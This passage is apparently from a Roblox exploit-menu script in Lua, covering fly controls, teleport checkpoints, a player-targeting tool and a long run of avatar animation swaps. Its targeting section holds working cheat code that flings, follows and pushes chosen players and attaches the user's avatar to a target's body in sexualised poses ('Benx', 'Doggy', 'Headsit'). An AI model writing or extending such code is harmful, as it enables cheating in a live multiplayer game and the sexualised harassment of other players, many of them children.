FlySpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		local Speed = FlySpeed_Input.Text:gsub("%D", "")
		if Speed == "" then
			Speed = 50
		end
		FlySpeed = tonumber(Speed)
		SendNotify("System Broken","Fly speed updated.",5)
	end)
end)

Respawn_Button.MouseButton1Click:Connect(function()
	local RsP = GetRoot(plr).Position
	plr.Character.Humanoid.Health = 0
	plr.CharacterAdded:wait(); task.wait(GetPing()+0.1)
	TeleportTO(RsP.X,RsP.Y,RsP.Z,"pos","safe")
end)

SaveCheckpoint_Button.MouseButton1Click:Connect(function()
	SavedCheckpoint = GetRoot(plr).Position
	SendNotify("System Broken","Checkpoint saved.",5)
end)

ClearCheckpoint_Button.MouseButton1Click:Connect(function()
	SavedCheckpoint = nil
	SendNotify("System Broken","Checkpoint cleared.",5)
end)

local flying = true
local deb = true
local ctrl = {f = 0, b = 0, l = 0, r = 0}
local lastctrl = {f = 0, b = 0, l = 0, r = 0}
local KeyDownFunction = nil
local KeyUpFunction = nil
Fly_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(Fly_Button)
	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		flying = true
		if game:GetService("UserInputService").TouchEnabled then
			Fly_Pad.Visible = true
		end
		local UpperTorso = plr.Character.UpperTorso
		local speed = 0
		local function Fly()
			local bg = Instance.new("BodyGyro", UpperTorso)
			bg.P = 9e4
			bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			bg.cframe = UpperTorso.CFrame
			local bv = Instance.new("BodyVelocity", UpperTorso)
			bv.velocity = Vector3.new(0,0.1,0)
			bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
			PlayAnim(10714347256,4,0)
			repeat task.wait()
				plr.Character.Humanoid.PlatformStand = true
				if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
					speed = speed+FlySpeed*0.10
					if speed > FlySpeed then
						speed = FlySpeed
					end
				elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
					speed = speed-FlySpeed*0.10
					if speed < 0 then
						speed = 0
					end
				end
				if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
				elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				else
					bv.velocity = Vector3.new(0,0.1,0)
				end
				bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/FlySpeed),0,0)
			until not flying
			ctrl = {f = 0, b = 0, l = 0, r = 0}
			lastctrl = {f = 0, b = 0, l = 0, r = 0}
			speed = 0
			bg:Destroy()
			bv:Destroy()
			plr.Character.Humanoid.PlatformStand = false
		end

		KeyDownFunction = mouse.KeyDown:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 1
				PlayAnim(10714177846,4.65,0)
			elseif key:lower() == "s" then
				ctrl.b = -1
				PlayAnim(10147823318,4.11,0)
			elseif key:lower() == "a" then
				ctrl.l = -1
				PlayAnim(10147823318,3.55,0)
			elseif key:lower() == "d" then
				ctrl.r = 1
				PlayAnim(10147823318,4.81,0)
			end
		end)

		KeyUpFunction = mouse.KeyUp:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 0
				PlayAnim(10714347256,4,0)
			elseif key:lower() == "s" then
				ctrl.b = 0
				PlayAnim(10714347256,4,0)
			elseif key:lower() == "a" then
				ctrl.l = 0
				PlayAnim(10714347256,4,0)
			elseif key:lower() == "d" then
				ctrl.r = 0
				PlayAnim(10714347256,4,0)
			end
		end)
		Fly()
	else
		flying = false
		Fly_Pad.Visible = false
		KeyDownFunction:Disconnect()
		KeyUpFunction:Disconnect()
		StopAnim()
	end
end)

FlyAButton.MouseButton1Down:Connect(function()
	keypress("0x41")
end)
FlyAButton.MouseButton1Up:Connect(function ()
	keyrelease("0x41")
end)

FlySButton.MouseButton1Down:Connect(function()
	keypress("0x53")
end)
FlySButton.MouseButton1Up:Connect(function ()
	keyrelease("0x53")
end)

FlyDButton.MouseButton1Down:Connect(function()
	keypress("0x44")
end)
FlyDButton.MouseButton1Up:Connect(function ()
	keyrelease("0x44")
end)

FlyWButton.MouseButton1Down:Connect(function()
	keypress("0x57")
end)
FlyWButton.MouseButton1Up:Connect(function ()
	keyrelease("0x57")
end)

--TARGET
ClickTargetTool_Button.MouseButton1Click:Connect(function()
	local GetTargetTool = Instance.new("Tool")
	GetTargetTool.Name = "ClickTarget"
	GetTargetTool.RequiresHandle = false
	GetTargetTool.TextureId = "rbxassetid://2716591855"
	GetTargetTool.ToolTip = "Select Target"

	local function ActivateTool()
		local root = GetRoot(plr)
		local hit = mouse.Target
		local person = nil
		if hit and hit.Parent then
			if hit.Parent:IsA("Model") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent)
			elseif hit.Parent:IsA("Accessory") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent.Parent)
			end
			if person then
				UpdateTarget(person)
			end
		end
	end

	GetTargetTool.Activated:Connect(function()
		ActivateTool()
	end)
	GetTargetTool.Parent = plr.Backpack
end)

FlingTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(FlingTarget_Button)
		if FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			if TouchFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
				ChangeToggleColor(TouchFling_Button)
			end
			local OldPos = GetRoot(plr).Position
			ToggleFling(true)
			repeat task.wait()
				pcall(function()
					PredictionTP(Players[TargetedPlayer],"safe")
				end)
				task.wait()
			until FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			TeleportTO(OldPos.X,OldPos.Y,OldPos.Z,"pos","safe")
		else
			ToggleFling(false)
		end
	end
end)

ViewTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(ViewTarget_Button)
		if ViewTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					game.Workspace.CurrentCamera.CameraSubject = Players[TargetedPlayer].Character.Humanoid
				end)
				task.wait(0.5)
			until ViewTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			game.Workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
		end
	end
end)

FocusTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(FocusTarget_Button)
		if FocusTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					local target = Players[TargetedPlayer]
					TeleportTO(0,0,0,target)
					Push(Players[TargetedPlayer])
				end)
				task.wait(0.2)
			until FocusTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
		end
	end
end)

BenxTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(BenxTarget_Button)
		if BenxTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(5918726674,0,1)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local otherRoot = GetRoot(Players[TargetedPlayer])
					GetRoot(plr).CFrame = otherRoot.CFrame * CFrame.new(0,0,1.1)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until BenxTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

HeadsitTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(HeadsitTarget_Button)
		if HeadsitTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local targethead = Players[TargetedPlayer].Character.Head
					plr.Character.Humanoid.Sit = true
					GetRoot(plr).CFrame = targethead.CFrame * CFrame.new(0,2,0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until HeadsitTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

StandTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(StandTarget_Button)
		if StandTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(13823324057,4,0)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = GetRoot(Players[TargetedPlayer])
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(-3,1,0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until StandTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

BackpackTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(BackpackTarget_Button)
		if BackpackTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = GetRoot(Players[TargetedPlayer])
					plr.Character.Humanoid.Sit = true
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(0,0,1.2) * CFrame.Angles(0, -3, 0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until BackpackTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

DoggyTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(DoggyTarget_Button)
		if DoggyTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(13694096724,3.4,0)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = Players[TargetedPlayer].Character.LowerTorso
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(0,0.23,0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until DoggyTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

DragTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(DragTarget_Button)
		if DragTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(10714360343,0.5,0)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = Players[TargetedPlayer].Character.RightHand
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(0,-2.5,1) * CFrame.Angles(-2, -3, 0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until DragTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

PushTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		local pushpos = GetRoot(plr).CFrame
		PredictionTP(Players[TargetedPlayer])
		task.wait(GetPing()+0.05)
		Push(Players[TargetedPlayer])
		GetRoot(plr).CFrame = pushpos
	end
end)

TeleportTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		TeleportTO(0,0,0,Players[TargetedPlayer],"safe")
	end
end)

WhitelistTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		if table.find(ScriptWhitelist, Players[TargetedPlayer].UserId) then
			for i,v in pairs(ScriptWhitelist) do
				if v == Players[TargetedPlayer].UserId then
					table.remove(ScriptWhitelist, i)
				end
			end
			SendNotify("System Broken",TargetedPlayer.." removed from whitelist.",5)
		else
			table.insert(ScriptWhitelist, Players[TargetedPlayer].UserId)
			SendNotify("System Broken",TargetedPlayer.." added to whitelist.", 5)
		end
	end
end)

TargetName_Input.FocusLost:Connect(function()
	local LabelText = TargetName_Input.Text
	local LabelTarget = GetPlayer(LabelText)
	UpdateTarget(LabelTarget)
end)

--ANIMATIONS

VampireAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

HeroAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ZombieClassicAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

MageAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

GhostAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ElderAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

LevitationAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

AstronautAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

NinjaAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

WerewolfAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

CartoonAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PirateAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

SneakyAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ToyAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

KnightAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

--NEWS
ConfidentAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PopstarAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PrincessAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

CowboyAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PatrolAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1150944216"
